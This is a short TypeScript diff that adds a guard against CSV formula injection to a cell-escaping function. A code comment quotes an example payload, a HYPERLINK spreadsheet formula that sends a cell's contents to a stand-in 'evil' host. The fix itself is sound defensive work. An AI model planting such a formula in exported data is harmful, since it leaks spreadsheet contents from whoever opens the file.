@@ -1,6 +1,12 @@
 /** Escape a single CSV cell. */
 export const csvEscape = (v: unknown): string => {
-  const s = v === null || v === undefined ? '' : String(v);
+  let s = v === null || v === undefined ? '' : String(v);
+  // Formula injection guard: a cell starting with =, +, -, @, tab, or CR is
+  // executed as a formula by Excel/Sheets on open (e.g. a free-text field
+  // like =HYPERLINK("http://evil/steal?c="&A1,"View") entered by any user
+  // whose data later gets exported). Prefixing with an apostrophe forces
+  // spreadsheet apps to treat it as literal text.
+  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
   if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
   return s;
 };
